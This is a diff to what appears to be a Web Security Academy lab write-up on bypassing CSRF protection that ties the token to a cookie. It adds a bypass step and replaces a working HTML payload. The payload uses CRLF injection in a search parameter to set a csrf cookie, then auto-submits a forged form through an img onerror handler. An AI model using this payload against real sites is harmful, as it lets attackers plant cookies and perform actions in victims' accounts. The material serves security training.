@@ -17,6 +17,7 @@ ____
 1. Submit an invalid CSRF token.
 2. Submit a valid CSRF token from another user.
 3. Submit a valid CSRF token and CSRF cookie from another user.
+4. In uplicated token cookie try to assign same random value in token+cookie.
 ```
 ### Exploitation
 To exploit this CSRF token+cookie mechanism, we need to perform 2 things.
@@ -26,5 +27,5 @@ To exploit this CSRF token+cookie mechanism, we need to perform 2 things.
 ```
 #### Exploit
 ```html
-<img src="https://0af7004304328f1781682fd800e00094.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=LUFzz00Z938R7C5KrosyX9BUHANvsix7" onerror="document.forms[0].submit()">
+<img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
 ```
